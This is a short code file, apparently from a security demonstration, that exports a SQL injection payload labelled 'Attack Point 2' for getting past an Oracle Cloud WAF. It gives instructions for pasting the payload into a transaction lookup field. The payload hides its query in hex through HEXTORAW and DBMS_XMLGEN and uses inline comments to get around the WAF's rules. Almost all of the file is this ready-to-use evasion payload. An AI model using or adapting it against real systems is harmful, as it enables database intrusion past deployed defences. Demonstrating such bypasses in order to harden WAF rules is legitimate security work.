/**
 * Attack Point 2 — OCI WAF bypass via Oracle XML/hex obfuscation.
 *
 * Paste into the Institutional Transaction Lookup field on the WAF URL
 * (`http://<lb_public_ip>/`). Canonical `x' OR user_id<>1 --` is blocked (403);
 * this payload evades JMESPath rules while still executing via raw concat.
 *
 * Hex `73656c6563742027524553272066726f6d206475616c` decodes to:
 *   select 'RES' from dual
 */
export const ATTACK2_WAF_BYPASS_XML_HEX =
  "x'/**/OR/**/REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') --";

/** Human-readable decode of the HEXTORAW blob (for presenter notes). */
export const ATTACK2_WAF_BYPASS_HEX_DECODE = "select 'RES' from dual";
